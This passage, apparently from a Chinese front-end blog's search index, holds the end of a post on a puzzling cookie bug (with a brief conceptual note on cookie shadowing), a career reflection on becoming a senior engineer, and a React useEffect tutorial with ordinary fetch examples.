可以做什麼呢？舉幾個上面參考資料給的例子（但我不確定有沒有理解錯誤，有錯的話請指正），第一個是 Gmail 的視窗不是分成兩部分嗎，一部分是信箱，另外一部分是 Hangouts。攻擊者可以利用上面講的手法把原來使用者的 cookie 蓋掉，換成自己的 session cookie，可是因為 Hangouts 跟 Gmail 本身的 domain 不一樣，所以 Gmail 還是使用者的帳號，Hangouts 卻已經變成攻擊者的帳號了。 被攻擊的人就很有可能在不知情的狀況下利用攻擊者的帳號來發送訊息，攻擊者就可以看到那些訊息了。 第二個例子是某間銀行網站，假如在使用者要新增信用卡的時候把 session cookie 換成攻擊者的，那這張信用卡就新增到攻擊者的帳戶去了！ 大概就是這樣，總之都是透過把原本的 cookie 遮蔽住，讓 server side 使用新的 cookie 的攻擊方法。 總結我一開始碰到這個問題的時候真的滿苦惱的，因為怎麼想都想不到為什麼一個語法完全沒錯的指令沒辦法寫入 Cookie，而且https://admin.huli.com這個網站我平常也很少用到，根本不會想到是它的問題。 但這次把問題解掉之後重新回來看，其實過程中就有一些蛛絲馬跡可循，例如說可以透過「清掉 Cookie 就沒事」這點得知應該是跟其他 Cookie 有干擾，也可以從別的瀏覽器可以寫入這點得知應該是 Chrome 的一些機制。 過程中的每個線索都會帶你找到新的路，只要堅持走下去，一定能成功闖出迷宮。","link":"/2017/08/27/a-cookie-problem/"},{"title":"兩年過後，我能夠被稱為資深工程師了嗎？","text":"前言在兩年前我寫了這篇一個資淺工程師年末的自我省視，內文主要是檢視自己那年學到的東西以及抒發心得感想，並提出一些對於自己職涯發展上的疑問。 標題之所以是打「資淺」工程師，是因為那時覺得連資深的邊都沾不上，所以用了資淺這個字來形容自己。 兩年過去了，職稱從工程師變成資深工程師，甚至還再往上變成了 Front-end Team Lead。雖然職稱本來就不代表一切，但我認為它至少「代表著什麼」，你到了那個位子就必須負起責任，如果覺得自己能力未及，就必須盡力去追趕，直到自己能擔起那個責任為止。 這篇會先回顧我這兩年來的發展，最後再分享一些自己的心得感想。 在這之前一樣先預祝各位讀者新年快樂！ 技術的深度兩年前我在文中提到自己是一個有廣度沒深度的人，希望自己之後能走得更深一點，把基礎打的更紮實。而這兩年之間的確有朝這個方向邁進，開始發一些比較有深度的技術文章，這些文章的靈感常常來自於工作。 像是在工作時被資安部門警告有 CSRF 漏洞，於是花了點時間研究，並寫下了讓我們來談談 CSRF，也在差不多的時間點發現令我十分不解的 Cookie 問題，誤打誤撞解開後深入研究，理解問題以後寫了我遇過的最難的 Cookie 問題。不同的工作內容也會碰到不同的問題，例如說在做 PWA 時碰到的原來 CORS 沒有我想像中的簡單以及完成 PWA 後的PWA 實戰經驗分享。 除了工作上得到的靈感，自己深深覺得對 JavaScript 的基礎掌握不足，那些常見的面試題我從來沒有搞懂過為什麼。儘管這些在工作上不一定用得到，但如果我想成為資深工程師，我認為那是逃不掉的，是一定要理解的東西。 針對這個部分，我寫的第一篇文章是該來理解 JavaScript 的原型鍊了並且得到滿多好評，再來寫了深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？，把自己對這個議題的意見做了個整理，然後是近期的我知道你懂 hoisting，可是你了解到多深？與所有的函式都是閉包：談 JS 中的作用域與 Closure，把知名的 hoisting 與 closure 都深入研究了一遍。這樣看下來，大概再把 this 寫完（我也有這個計畫要寫）就能把 JavaScript 那些比較常見的基礎給搞定了，再來可能就是型別轉換的一些問題。 除了 JavaScript 以外，也寫了幾篇文章是關於網路跟瀏覽器的，像是給新手看的輕鬆理解 Ajax 與跨來源請求、我以前一直被搞混最後終於弄懂的循序漸進理解 HTTP Cache 機制以及DOM 的事件傳遞機制：捕獲與冒泡，或偶爾研究一下比較新的東西像統一網頁支付介面：Payment Request API。 從 2015 年開始，我的前端開發生涯就一直圍繞著 React 打轉，所以有時候也會寫一些相關的主題像是React 性能優化大挑戰：一次理解 Immutable data 跟 shouldComponentUpdate與淺談 React Fiber 及其對 lifecycles 造成的影響，或是為了要用 redux-observable 而去學 RxJS 最後寫下的希望是最淺顯易懂的 RxJS 教學。 兩年之間寫了二十幾篇文章，要特別感謝 TechBridge 的夥伴們提出一起經營共筆部落格這個 idea，強迫自己一個月一定要寫出一篇文章來。 即使寫了這麼多，我知道還是有很多主題沒有涵蓋到，就算是寫過的主題也不一定已經完全理解，我覺得這是寫作的人要很小心的一個部分（或也可以說是我對自己的提醒），否則一不小心就會變得自大了起來，卻沒意識到這個世界比你想像中大的多。 像是我前幾天看到這篇文章：騰訊前端面試篇（一）分享自己去騰訊面試的心得，裡面問到的有些題目其實我就不會，所以要學的還多著呢。 除了不能自大以外，也要小心不能妄自菲薄，但這超級難，有時候這個點很難抓，要慢慢去找到那個界線。我不會說自己對某個主題理解到百分之百，但也不會說自己完全不理解，畢竟寫了這麼多主題，對寫過的東西還是有一定程度的理解，這點自信還是要有的。 話說還有一個要小心的陷阱，那就是其實很多人都會這些技術，只是沒有 po 文沒有分享而已。我以前曾經認為有些東西找不太到文章是不是沒什麼人會，不是，他們只是沒有分享出來而已，還是有很多人會的。 技術的廣度兩年前我覺得自己廣度比深度多很多，因此我寫了一大堆文章針對不同的主題深入研究，讓自己對技術的理解變得更深。 那廣度呢？有了深度以後，我對廣度便不是這麼在乎了。我在第一份工作時還沒決定好自己想往哪裡走，因此我用 node.js 寫後端，用 react+redux 寫前端，還用 Java 寫了 Android 的 App。 可是在那之後我變成了專職的前端工程師，因此對後端技術便不是那麼關注，有哪些新的潮流我都不知道，更不用說 mobile 了。還是會維持一些基本的敏感度，例如說知道新出的 Flutter 之類的，但也僅僅知道這個關鍵字而已。 這其實也是我想走的方向，我覺得先廣再深其實是很不錯的一件事，你得先廣才能去找到自己想走的方向，並且也在這段時期累積一些對其他領域的基本理解，接著才走深，去深入理解你選的那個領域。 以我來說，我在廣度時期讓自己理解後端、Mobile 開發或是一點架構層面的東西，這些都對我之後的職涯很有幫助，至少我有基本的概念，不會什麼都不懂。 而現在進入到深度時期，把心力放在 JavaScript、瀏覽器、網路跟 React，其他的便不是那麼關注。 但如果要我挑幾個在這以外想研究一下的主題，我會選 GraphQL 跟 Vue，希望能對這兩個東西有基本的理解。 融會貫通到了某個時期，會開始能把以前學過的東西融會貫通並且確切的知道其脈絡發展，而我在這兩年間似乎就到了這個時期。 其實以前就有這種能力了，只是在近期變得更明顯而已。掌握了脈絡以後就能夠很清楚地去解釋一項技術的出現以及為什麼要選用這個技術，能夠知道背後的核心思想，經過這樣的思考以後寫出來的東西是不一樣的。 除了技術深度的發展以外，我也會寫一些面向一般大眾的科普文，像是零基礎的小明要如何成為前端工程師？以及跟著小明一起搞懂技術名詞：MVC、SPA 與 SSR，就是自己整理消化以後再產生出來的東西。 我自己認為之所以這些文章底下一片好評，就是因為它有脈絡。技術的發展是有脈絡的，React 會出現一定是為了要解決一些 jQuery 沒辦法解決、Angular 也沒辦法解決的問題，否則我們不需要一個新的技術，而這新技術也不會變得那麼受歡迎。 只要能夠找到那個理由，就能把這些點串起來連成一條線，連多了就變成一個面，成為完整的知識圖譜。 在上面那兩篇文章中我從最陽春的狀態開始一步步往下推，其實就好像數學證明或是邏輯證明那樣，每一步都跟上一步有關，在證明的過程中會變得越來越複雜，但每個步驟都是環環相扣的。 叫一個新手直接去碰 React，就好像直接讓他從證明的第十步開始往下做，他不知道怎麼到這裡來的，也需要花很多時間去研究該怎麼前進到下一步。但如果你讓他從第一步開始，帶他到第二步、第三步這樣一步步證明下去，當到了第十步時，他知道自己為何在這裡，他知道這一步其實是前面十步的累積，這就是有脈絡跟沒有脈絡的差異。 而我的那些文章之所以特別，是因為我帶讀者從第一步開始走，一步步帶著他們到第十步。所以對沒什麼基礎的人來說，不會感到特別困難；對已經有基礎的人來說，會把以前學過的東西全部串起來，有種煥然一新的感覺。 教學從以前其實就陸陸續續有在做教學，但在今年的一月終於嘗試了自己一直以來想做的事：從零到一培養一個工程師。 總共還做了兩期，計畫詳細內容可參考：程式導師實驗計畫第二期報名簡章，課程大綱也放到了 GitHub 上面，想跟著學的可以自行取用。 目前第二期已經慢慢接近尾聲，但大概要等二月初才比較好評量成效。在教學的過程中我才是學到最多東西的那個人，每次準備教學前我都必須確定自己能完全掌握要講的主題，趁機理解了一些以前很少接觸到的概念，像是資料庫的 View、Stored Procedure 跟 Trigger 以及 ACID。 課綱的部分也是按照我前面所講的脈絡設計而成，但碰到的問題是難度落差有點太大，所以還有滿多需要調整的地方。不過整體而言教的東西我認為是沒什麼問題的，該學的都有學到，而且不只學了工具，也學了原理。 教學是少數我能維持動能並堅持下去的事，雖然是兼職教學，但我自認課程品質不會跟那些全職教學的差到太遠，以一人團隊來說，我覺得做得不錯了。但當然我也不會就停在這裡，畢竟我認為課程永遠都有改善的空間。 教學相關的心得等課程結業後會再寫一篇文，這邊就先簡單帶過了，不然我怕這篇文會變得太長。 溝通一年前剛接 Front-end Team Lead 的職位時其實戰戰兢兢，那時候主管只是問我有沒有興趣慢慢來試試看，我說可以慢慢試試看，下禮拜我就被拉到這職位了。我原本以為會先跟在主管旁邊見習一下之類的，結果完全沒有。 不過雖然說是 Team Lead，其實更像是 Lead engineer。差異在於前者會更偏向管理職要帶人，後者則是著重在技術面。我覺得以工作內容來說，其實後者更為貼近一點。 我要做的事情就是跟 PM 溝通，每兩週開一次 sprint planning meeting 看要放什麼 ticket 進來。有新的功能時要給 PM 一個大概的時間估計，也要把 ticket 分發給其他同事，決定他們要做哪些事情。 簡單來說我一個人對 PM，其他前端工程師則是負責去解那些 ticket。不過我自己也是要寫 code 啦，但有一部分時間要留給跟 PM 溝通，只要前端有任何問題他們就是找我，我自己認為大概 8 成時間還是寫 code，其他 2 成處理跟專案有關的事情，簡單來說就是要一直溝通。 以前其實就知道自己溝通能力並不差，但這次會覺得緊張是因為要用英文溝通…剛進公司的時候英文能力頗差（現在也沒多好），深怕自己只會一直跳針說：「Sorry, can you repeat again?」。 起初的時候還真的有點溝通問題，但接了這個位子兩三個月以後發現開始慢慢習慣了，開會的時候超級無敵專心聽雖然還是有些單字聽不懂，但一樣抓關鍵字就好了，聽懂七八成基本上就能夠溝通的滿順暢。 除了這個以外，最近幾個月也開始當起面試官。我一直覺得面試對公司來說是一件需要非常注重的事，因為就是公司對外的門面，一場糟糕的面試比一頓難吃的晚餐更為不堪。 對於面試我也還在摸索自己怎樣能夠做得更好，但我謹記前輩說的話，他說面試不是要比誰厲害，而是要去看面試者的優點，去看他是否適合這個位置，是否想要與他共事。如果面試只是想要電人來凸顯自己的優越，那就完全失去意義了。 順帶一提，有些人的履歷真的寫得很不怎麼樣，十年工作經驗卻看不出到底做了什麼事。 所以，我是資深工程師嗎？好，回顧了這麼多終於回到了標題。 兩年前那篇我提到了這篇很棒的文章：如何才有資格稱為資深工程師，裡面提供了一些指標可以參考，更貼心地提供了反指標讓大家知道走火入魔是什麼樣子。 經過這兩年的磨練，在前公司獨立完成直播網站的開發，也在此期間加深自己對基礎的理解，對開發新功能的理解從：「不知道自己能否做到」轉變為「做得到，可能需要多少時間」，在自信心上面提昇了不少。 在現在的公司也終於有了更多討論與交流的機會，跟另外兩位前端討論要選哪個 library、coding style 怎麼定、檔案命名規則怎麼定等等，也更頻繁地與 PM 交流，對溝通以及專案管理有了進一步的理解。 這一年來負責公司的四個前端專案，對專案的架構或是使用的技術上也有了不同的理解，做不同的專案的時候都可以觀摩一下別人寫的架構跟程式碼，培養了看到爛 code 就會想順手修掉的習慣，對於重構之前看到有人說了一句很棒的話：「很多工程師都只會重建，而不會重構」，重構應該是漸進的，如果想等到有時間再砍掉重練，那永遠等不到。 應該做的是在修 bug 或是寫新功能時就順手修掉一些，例如說今天改一個購買流程的東西，我就會順手把那部分重構一下，不一定要做到你心中完美的樣子，只要確保比以前的程式碼品質更好就行了，這樣就會越來越好。 而工作以外的時間寫寫 Blog 分享心得，偶爾花個六七小時只為了寫一篇技術文章，大部分的時間則花在教學培訓，成功轉職的學生也印證了課綱的價值，透過教學也把自己的基礎打得更紮實了一點。 兩年前，工作經驗一年半，剛進入第二家公司任職，自認程式寫得不差但基礎不好，經驗也不足，配不上資深這個名字，因此以資淺工程師自稱。 兩年過後，我可以把前端出現的各種工具放到脈絡裡去談，去解釋為什麼會出現，解釋帶來的好處是什麼，也可以說明在專案中應該如何使用；對前端工程師的必備技能也有一定的基礎，可以跟你談 JavaScript 的各種奇怪現象，要談網路談瀏覽器也行；對 PM 提出的需求通常不會擔心做不做得出來，因為知道自己一定行，關注的點反而變成要如何實作才能做的漂亮以及完成所需要的時間；知道工程師除了寫程式以外，還有很多重要的事情要做，像是理解需求、溝通以及思考。 是的，我覺得我是資深工程師了。 認同請按讚，喜歡請分享（開玩笑的）。 接下來呢？當你懂的愈多，也會愈知道自己不足的地方在哪裡，還有很多需要磨練的地方，就算是資深工程師，也有 90 分與 60 分的差異，學無止盡，要學的東西還多著，下面整理出幾個我想加強的方向： 第一，JavaScript 我有一定的基礎但還不夠穩，我希望能把這塊再練的穩一點，希望能穩到看任何 JavaScript 相關的文章都很難感到驚訝的程度。 第二，我在測試這方面弱到爆炸，只有 unit test 的經驗，React 裡面要對 component 做測試的話我還是不知道要測什麼，對 end-to-end testing 也沒什麼經驗。我認為測試是邁向下個階段很重要的關鍵，它可以改變你看程式碼的角度，並且讓品質變得更好。 第三，對使用的工具理解還可以再更深一點，希望能花些時間去研究 Vue、React 跟 Redux 的原始碼，去看一下他們是怎麼做的，除此之外，也能夠從裡面學到很多架構與設計方面的知識。 第四，對於一些「基礎」的理解不足，我這邊指的是瀏覽器跟網路。我大概看過瀏覽器渲染的過程，但我覺得對其中的各個環節還不夠理解，網路的話希望能把 HTTP、HTTP2 或是 TCP&#x2F;IP 這些東西看熟一點。 第五，computer science 的基礎不足，例如作業系統跟計算機組織還有演算法與資料結構，如果想要再往上，這些也是很重要的一部分，想學習的話比較有效的方式應該是直接去找大學開的課程來看，幫助應該滿大。 技術是工程師的根本，不能忘記這點，也千萬不能讓自己的技術荒廢。是因為有了技術能力，我才能走到現在這個位置。 總結很慶幸自己在兩年前有寫了那篇文章，幫自己做了一個很好的總結，正是因為有把當時的心得留下來，現在才能夠對照自己以前的樣子。 重看了一遍兩年前的那篇回顧，發現自己在觀念上還是差不多的，還是很注重分享，所以這兩年之間從未間斷。對於「痛過才能理解」還是抱持著一樣的想法，也把這些概念變成文章記錄起來，不然每提到一次就要重新再講一次，很不符合工程師的性格，能重構就應該儘早重構。對於廣度與深度的看法，支持先廣再深，因為那樣走過來的我覺得很有幫助；而小公司與大公司的問題，現在還沒進過大公司所以無法體會，可能要再過好一陣子才能跟大家分享這塊的心得。 其實每次在寫這種回顧的時候，都會先感嘆一下時間就這樣過去了，完全沒有意識到已經過了兩年；不過也就是因為這樣，會更讓人期待自己下一次會變成什麼樣子。 就這樣啦，我們兩年後再見！","link":"/2018/12/29/after-two-years-am-i-senior/"},{"title":"淺談 React 中的 state 與 useEffect","text":"前言最近在臉書上的前端社群看到了一篇文章：理解 React useEffect 02，內容是有關於 useEffect 的使用方式，後來在留言串也有了一些討論。 其實當初第一眼看到這篇文章的用法，我也是覺得有些奇怪，不過我其實多少能夠理解為什麼是這樣寫，只是還是覺得怪怪的。原本想留言，但是後來覺得「搞不好奇怪的是我」，就想說再思考一下。仔細思考過後，奇怪的還真的是我。 因此這篇來講一下我的想法，有錯的話歡迎在文章底下留言指正，或是在前端社群跟我討論也可以。在繼續閱讀之前，建議先看過上面那篇原文以及原文底下的討論，才會比較進入狀況。 比較沒有爭論的地方首先有一個比較沒有爭論的地方，先點出來以後底下就不多談了，那就是原 po 在社團中所說的： useEffect 常常被設定在【一定】要搭配 useCallback、useMemo 等 Hook 使用，是【一定】要用嗎？ 這個假設不確定是從哪裡聽來的，不過我個人倒是沒有聽過這種說法就是了。useEffect 本來就沒有一定要搭配什麼東西而用。想要理解 useEffect，並不需要他們。 useEffect 的用途就跟它的名字一樣：「拿來處理 side effects」用的。 useEffect 就是 useEffect，它跟其他那些 useCallback 或是 useMemo 並沒有什麼關聯，用途也完全不一樣。 不過我後來想想，會把這幾個搞混，可能跟 useEffect 的 dependencies array 有關吧？不過這就是另外的議題了，總之這幾個是可以完全不用混在一起的。 其他這篇文章要處理的部份整理一下底下的人提的幾個問題： 很少看到 useEffect 裡面做 api call 非同步請求通常會用到 redux 的 middleware 這個範例比較常見的寫法是在 onClick 的時候去呼叫搜尋，如果想要邊打字邊搜尋就是做在 input onChange，而不是原文的用法 第三個其實是我這篇文章特別想提的，前兩個我倒覺得沒什麼問題，而且可以一起回答。 許多非同步的操作會用 redux，並不代表非同步操作一定得用 redux。在有些情境之下，redux 其實是可以不需要用的。 以原 po 的例子來講，他就是要寫個簡單的搜尋功能，為什麼要用 redux？通常會需要用 redux 跟它的 middleware 有幾個原因： 你某些狀態必須讓很多不同的元件存取，所以要放在一個 global 的地方，比較好拿 某些非同步操作流程比較複雜，透過 redux-saga 或是 redux-observable 輔助會讓程式碼的可維護性更好 而這個範例既不是一也不是二，本來就沒有必要用 redux。 再者，在 component 裡面直接呼叫 API 本來就沒有不行，只是會需要處理一些問題，例如說 race condition。 然後像這種拿資料的，有兩個相關的 hook 滿多人用的，一個是 react-query，另外一個是 swr，這些也都是直接在 component 裡面呼叫 API。 不過「很少看到 useEffect 裡面做 api call」還有另外一種理解，那就是這指的並不是「在 component 裡面直接呼叫 API」這件事，而是在說比起在 useEffect 裡面直接呼叫，可能會包裝成另一個函式： // 第一種寫法：直接寫在裡面 useEffect(() => &#123; fetch(...) &#125;) // 第二種寫法：包成另一個 function function fetchData() &#123; fetch(...) &#125; useEffect(() => &#123; fetchData() &#125;) 那這樣其實就是 code 的結構上面的一些討論而已，這個在範例中我覺得也沒有到這麼重要，不過這跟我們待會要講的第三點有些關係。 從實際範例去理解上面所提到的第三點：「這個範例比較常見的寫法是在 onClick 的時候去呼叫搜尋，如果想要邊打字邊搜尋就是做在 input onChange，而不是原文的用法」，其實是我這篇想討論的重點。 為了更方便大家理解，就要先把範例講清楚，從範例去理解會更快一點。這邊會用一個跟原文不太一樣的範例，我覺得會更幫助理解一點。 這個例子是這樣的，畫面上有一個 input，當你打字的時候會呼叫 hacker news 的 api 搜尋相關主題，然後顯示在畫面上，如圖： 根據上面的敘述，我們可以很直覺地寫出以下的程式碼： import React, &#123; useState &#125; from \"react\"; const baseUrl = \"https://hn.algolia.com/api/v1/search?query=\"; export default function App() &#123; const [data, setData] = useState(&#123; hits: [] &#125;); const [query, setQuery] = useState(\"\"); async function fetchData(keyword) &#123; const result = await fetch(baseUrl + keyword).then((res) => res.json()); setData(result); &#125; const handleChange = (e) => &#123; const value = e.target.value; setQuery(value); fetchData(value); &#125;; return ( &lt;> &lt;input value=&#123;query&#125; onChange=&#123;handleChange&#125; /> &lt;ul> &#123;data.hits.map((item) => ( &lt;li key=&#123;item.objectID&#125;> &lt;a href=&#123;item.url&#125;>&#123;item.title&#125;&lt;/a> &lt;/li> ))&#125; &lt;/ul> &lt;/> ); &#125; CodeSandbox 連結：https://codesandbox.io/s/react-hook-normal-v1-y0l9e 用一個 state 叫做 query 來表示 input 的值，然後加上一個 handleChange 的事件去處理它，在裡面除了去更新 state 以外，也用 fetch 去抓 API 的資料然後 setData，就可以把資料顯示在畫面上。 好，一切都看似非常順利，沒有什麼問題。（實際的狀況會用 debounce 來處理發 request 那一段，但這不是重點所以就不加了） 但今天 PM 突然新增了一個需求： input 的預設值應該要是 redux，而且畫面一進來就要先去抓這個預設值的資料 此時如果你有寫過 class component，內心想的應該會是： 簡單嘛，不就把 query 預設值改成 redux，然後在 componentDidMount 的時候先去呼叫 fetchData 就好了嗎？ 於是你就改出了以下程式碼： import React, &#123; useState, useEffect &#125; from \"react\"; const baseUrl = \"https://hn.algolia.com/api/v1/search?query=\"; export default function App() &#123; const [data, setData] = useState(&#123; hits: [] &#125;); // 你改了這個 const [query, setQuery] = useState(\"redux\"); async function fetchData(keyword) &#123; const result = await fetch(baseUrl + keyword).then((res) => res.json()); setData(result); &#125; // 還有加了這個 useEffect(() => &#123; fetchData(query); &#125;, []); const handleChange = (e) => &#123; const value = e.target.value; setQuery(value); fetchData(value); &#125;; return ( &lt;> &lt;input value=&#123;query&#125; onChange=&#123;handleChange&#125; /> &lt;ul> &#123;data.hits.map((item) => ( &lt;li key=&#123;item.objectID&#125;> &lt;a href=&#123;item.url&#125;>&#123;item.title&#125;&lt;/a> &lt;/li> ))&#125; &lt;/ul> &lt;/> ); &#125; 不過此時程式碼守門員 ESLint 跳出了一個熟悉的警告： React Hook useEffect has a missing dependency: ‘query’. Either include it or remove the dependency array. (react-hooks&#x2F;exhaustive-deps) 這是因為 React 認為你在 useEffect 裡面用到了query 這個 dependency，為了怕你拿到舊的值而導致程式出 bug，特別提醒你說記得加上 dependencies。 不過在我們這個範例中，我們的需求的確是第一次 render 時才需要去呼叫 fetchData，所以這行為是沒錯的，因此暫時可以不用管它。 當你改好程式碼跑去找 PM 以後，他有點不好意思地看著你，跟你說：「抱歉，又要加一個新的需求了，老闆最近買了很多特斯拉的股票，所以請加上一個按鈕叫做 tesla，按下按鈕之後就會立刻把 input 的內容改成 tesla，並且搜尋這個關鍵字」 為了滿足老闆的需求，你又馬上改了一版給他： import React, &#123; useState, useEffect &#125; from \"react\"; const baseUrl = \"https://hn.algolia.com/api/v1/search?query=\"; export default function App() &#123; const [data, setData] = useState(&#123; hits: [] &#125;); const [query, setQuery] = useState(\"redux\"); async function fetchData(keyword) &#123; const result = await fetch(baseUrl + keyword).then((res) => res.json()); setData(result); &#125; useEffect(() => &#123; fetchData(query); &#125;, []); const handleChange = (e) => &#123; const value = e.target.value; setQuery(value); fetchData(value); &#125;; // 你加上了這個 const handleClick = () => &#123; setQuery(\"tesla\"); fetchData(\"tesla\"); &#125;; return ( &lt;> &lt;input value=&#123;query&#125; onChange=&#123;handleChange&#125; /> &lt;button onClick=&#123;handleClick&#125;>tesla&lt;/button> &lt;ul> &#123;data.hits.map((item) => ( &lt;li key=&#123;item.objectID&#125;> &lt;a href=&#123;item.url&#125;>&#123;item.title&#125;&lt;/a> &lt;/li> ))&#125; &lt;/ul> &lt;/> ); &#125; 範例程式碼：https://codesandbox.io/s/react-hook-normal-v2-zh7t7?file=/src/App.js 好，程式碼寫到這邊就差不多了，可以進入正題了。 上面的範例中，例如說以下程式碼： const handleChange = (e) => &#123; const value = e.target.value; setQuery(value); fetchData(value); &#125;; 我們在寫程式的時候是這樣想的：「當使用者輸入的 input 改變的時候，我應該更新 state，然後同時也去呼叫 API」。 const handleClick = () => &#123; setQuery(\"tesla\"); fetchData(\"tesla\"); &#125;; 在使用者點擊特斯拉按鈕時，我應該更新 state，然後再去呼叫一次 API，才能抓到最新的資料。 我們思考的點是：「當我做了某個動作之後，應該做什麼事情」。例如說當使用者輸入文字的時候，就應該抓取新的清單；當使用者按下按鈕，就應該去抓 tesla 的資料。 接著讓我來示範另一種寫法： import React, &#123; useState, useEffect &#125; from \"react\"; const baseUrl = \"https://hn.algolia.com/api/v1/search?query=\"; export default function App() &#123; const [data, setData] = useState(&#123; hits: [] &#125;); const [query, setQuery] = useState(\"redux\"); async function fetchData(keyword) &#123; const result = await fetch(baseUrl + keyword).then((res) => res.json()); setData(result); &#125; // 只有底下程式碼有變，上面都沒變 useEffect(() => &#123; fetchData(query); &#125;, [query]); const handleChange = (e) => &#123; setQuery(e.target.value); &#125;; const handleClick = () => &#123; setQuery(\"tesla\"); &#125;; return ( &lt;> &lt;input value=&#123;query&#125; onChange=&#123;handleChange&#125; /> &lt;button onClick=&#123;handleClick&#125;>tesla&lt;/button> &lt;ul> &#123;data.hits.map((item) => ( &lt;li key=&#123;item.objectID&#125;> &lt;a href=&#123;item.url&#125;>&#123;item.title&#125;&lt;/a> &lt;/li> ))&#125; &lt;/ul> &lt;/> ); &#125; 這個寫法跟我們之前最大的不同，就在於思考的方式完全不一樣。 我們原本思考的點是「當我做了某個動作之後，應該做什麼事情」。 而改成這樣以後，思考的點變成：「當 state 改變時，我要做什麼」，這是很 reactive 的寫法，針對某個變化做出反應。 我先確立了一件事，就是「當 state 改變時，我要去 call API」。因此當使用者輸入文字時，我唯一要做的就是改變 state；當使用者按下按鈕時，我也只要把 state 改成特斯拉就好。 我認為在這個情境底下，最能解釋 useEffect 的意義： useEffect(() => &#123; fetchData(query); &#125;, [query]); 當 query 改變時，我要去執行一個 side effect（fetchData） 這就是 useEffect 的意思：當 dependencies 改變時，我想去執行什麼 side effects。 然後我們程式碼中的 fetchData 其實只有那個 useEffect 會用到，所以可以搬進去，變成： useEffect(() => &#123; async function fetchData() &#123; const result = await fetch(baseUrl + query).then((res) => res.json()); setData(result); &#125; fetchData(); &#125;, [query]); 改完之後，其實就跟原 po 在文中給的範例很像了。 如果你想要一個專有名詞的話，我會說我們一開始示範的做法叫做 imperative，現在的則叫做 reactive（但專有名詞我真滴不熟，沒有十足把握，用錯請指正）。 還記得 React 的核心理念嗎？UI 只是 state 的一種呈現方式，UI = F(state)。因此在畫面改變時，我們不需要去管它怎麼變動的，只需要去改變 state 就可以了。 上面這種 reactive 的寫法我覺得也很類似，我們只需要去改變 state，並且寫明了當 state 改變時，應該要執行哪些動作（side effects）就好，不需要明確針對每個動作去寫出應該做些什麼。 回到原文的範例回到原文的範例，程式碼是這樣寫的： import React, &#123; useState, useEffect &#125; from \"react\" import axios from \"axios\" import \"./styles.css\" const baseUrl = \"https://hn.algolia.com/api/v1/search?query=\" export default function App() &#123; const [data, setData] = useState(&#123; hits: [] &#125;) const [query, setQuery] = useState(\"redux\") const [url, setUrl] = useState(baseUrl+query) useEffect(() => &#123; async function fetchData() &#123; const result = await axios(url) setData(result.data) &#125; console.log(\"hi\") fetchData() &#125;, [url]) return ( &lt;> &lt;input value=&#123;query&#125; onChange=&#123; event=>setQuery(event.target.value) &#125; /> &lt;button onClick=&#123; ()=>setUrl(baseUrl+query) &#125;>Search&lt;/button> &lt;ul> &#123;data.hits.map((item) => ( &lt;li key=&#123;item.objectID&#125;> &lt;a href=&#123;item.url&#125;>&#123;item.title&#125;&lt;/a> &lt;/li> ))&#125; &lt;/ul> &lt;/> ) &#125; 其中最令大家疑惑的一段，應該就是在按下搜尋按鈕時，大多數人會做的其實都是： fetchData(baseUrl + query) 但是程式碼裡面卻只是： setUrl(baseUrl+query) 然後再透過 useEffect 去呼叫 fetchData 。 上面的範例，其實就是我剛剛所講的第二種方式。 思考的點在於：「只要 url 這個 state 改變了，我就去 call API 拿資料」，而不是「當使用者按下按鈕時我要 call API」。 這是兩種完全不同的思考方式。 平時在寫程式的時候，比較多人常用的應該都還是第一種，做什麼操作之後除了要改變 state，還要額外做什麼事，比較少人有第二種的概念，但我認為第二種其實才是 React 的精髓之一。 不過實際使用時還是要看使用的情境而定，並沒有說哪一種一定比較好。例如說像是原文的範例，我自己就覺得這情境底下用這個思考模式就是有一點奇怪，可能是因為功能還不夠多（？） 但是以我上面舉的那個邊打文字就要邊送出 API 的範例來說，如果你有注意到的話，會發現我們每次更改 state 以後，都需要再寫一個 fetchData 去拿資料，在這種狀況底下，我覺得第二種確實是更適合的。 最後提一個東西，在 React 的官方文件當中有這樣一個範例（原本的範例沒有加上 dependencies，但其他段落有補上去）： import React, &#123; useState, useEffect &#125; from 'react'; function Example() &#123; const [count, setCount] = useState(0); useEffect(() => &#123; document.title = `You clicked $&#123;count&#125; times`; &#125;, [count]); return ( &lt;div> &lt;p>You clicked &#123;count&#125; times&lt;/p> &lt;button onClick=&#123;() => setCount(count + 1)&#125;> Click me &lt;/button> &lt;/div> ); &#125; 這也是 reactive 的寫法，就是我上面一直強調的：「當 state 改變，要執行甚麼 side effect」。 如果你要把它改成另一種寫法，就會長這樣： import React, &#123; useState, useEffect &#125; from 'react'; function Example() &#123; const [count, setCount] = useState(0); return ( &lt;div> &lt;p>You clicked &#123;count&#125; times&lt;/p> &lt;button onClick=&#123;() => &#123; document.title = `You clicked $&#123;count + 1&#125; times`; setCount(count + 1) &#125;&#125;> Click me &lt;/button> &lt;/div> ); &#125; 總結其實這篇我想討論的重點並不在 redux，也不在到底要從哪裡去 call API，這些都是其次。 重點是對 useEffect 這個 hook 的理解。 我對它的理解就是：「當 dependencies 改變之後要執行什麼 side effect，就寫在裡面」。 從這點延伸出去，就會有我上面所提的 reactive 的寫法：「當 state 改變以後，我要做些什麼」。 最後呢，有關於這些 hook 的東西，我首推 dan 哥的兩篇文章，寫得真的很讚： How Are Function Components Different from Classes? A Complete Guide to useEffect 這篇記錄了一下我對 useEffect 的理解，有什麼問題都可以再找我討論。 後記（於 2020-09-10 補充）文章發出之後，經社團中有人提醒才突然察覺到，其實我這篇講的只是 useEffect 的其中一個部分而已。 useEffect 沒有那麼複雜，就只是「function component render 之後會執行的 side effect」，就這樣而已。甚至可以跟 state 一點關係都沒有。我後來想想，覺得這樣的確才是對 useEffect 的正確理解。 至於這篇文章中所提到的，可以說是 useEffect 的其中一個應用方式。 因為 useEffect 的第二個參數可以指定「在哪些 dependencies 有變動的時候，我才想執行這個 side effect」，然後你在 dependencies 之中可以放 state，那就變成這篇文章所說的：「當 state 改變以後，我想做些什麼」。所以這篇提的只是 useEffect 的其中一個用法而已，並沒有看到 useEffect 的全貌。 useEffect 就是：「function component render 之後，會執行的 side effect」。 而文章中提的用法，就只是把 useEffect 加上 dependencies，變成：「function component render 之後，『如果 state 改變了』，會執行的 side effect」。 另外，其實上面那句用「如果 state 改變了」也沒有到那麼精確，因為在 didMount 的時候也會執行 useEffect，但那時候 state 並沒有變，還是初始值。所以更精確的講法或許是：「function component render 之後，如果是 didMount 或是 state 改變了，會執行的 sideEffect」。 感謝陳冠霖的指正。","link":"/2020/09/09/about-react-state-and-hooks-use-effect/"},{"title":"輕鬆理解 Ajax 